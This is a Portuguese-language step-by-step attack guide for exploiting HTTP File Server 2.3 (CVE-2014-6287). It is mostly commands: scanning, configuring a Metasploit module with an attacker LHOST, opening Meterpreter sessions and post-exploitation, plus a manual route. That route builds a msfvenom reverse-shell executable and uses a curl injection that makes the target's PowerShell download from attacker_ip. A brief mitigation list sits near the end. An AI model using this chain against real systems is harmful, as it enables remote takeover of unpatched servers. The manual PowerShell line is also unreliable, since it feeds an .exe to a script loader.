## Exploiting Vulnerable HTTP File Server (HFS)

O **HTTP File Server (HFS)** é frequentemente explorado quando versões antigas estão em uso, especialmente a **2.3** que possui RCE conhecida.

Software alvo:

- HTTP File Server

Exploit comum:

- CVE-2014-6287 (Remote Command Execution)

---

# Fase 1 — Descoberta

### Scan inicial

nmap -sV -p80 target

Saída típica:

80/tcp open  http  
Server: HFS 2.3

---

# Fase 2 — Confirmar versão

Acessar via browser:

http://target

Header geralmente mostra:

HFS 2.3

---

# Fase 3 — Buscar exploit no Metasploit

msfconsole  
search hfs

Exploit encontrado:

exploit/windows/http/rejetto_hfs_exec

---

# Fase 4 — Configurar exploit

use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS target  
set RPORT 80  
set LHOST attacker_ip  
set LPORT 4444  
exploit

---

# Fase 5 — Payload executado

Exploit:

1. Injeta comando via URL
2. Baixa payload
3. Executa
4. Abre conexão reversa

---

# Fase 6 — Shell obtido

Resultado esperado:

Meterpreter session 1 opened

Interagir:

sessions  
sessions -i 1

---

# Fase 7 — Pós exploração

getuid  
sysinfo  
shell

---

# Exploração manual (sem Metasploit)

Payload simples:

msfvenom -p windows/meterpreter/reverse_tcp \  
LHOST=attacker_ip \  
LPORT=4444 \  
-f exe -o shell.exe

Host:

python3 -m http.server 80

Exploit via curl:

curl "http://target/?search=%00{.exec|cmd.exe /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/shell.exe').}"

---

# Fluxo do ataque

Scan  
 ↓  
Detectar HFS  
 ↓  
Exploit RCE  
 ↓  
Payload download  
 ↓  
Reverse shell  
 ↓  
Meterpreter

---

# Indicadores de vulnerabilidade

|Sinal|Significado|
|---|---|
|HFS 2.3|Vulnerável|
|Sem autenticação|Alto risco|
|Upload permitido|Execução possível|

---

# Classificação

|Fase|Tipo|
|---|---|
|HTTP enum|Network-based|
|HFS exploit|Remote exploit|
|Payload|Initial access|
|Meterpreter|Post-exploitation|

---

# Mitigação (defesa)

- Atualizar HFS
- Bloquear porta 80 externa
- Usar autenticação
- WAF

---

# Comando completo (rápido)

msfconsole  
use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS target  
set LHOST attacker_ip  
exploit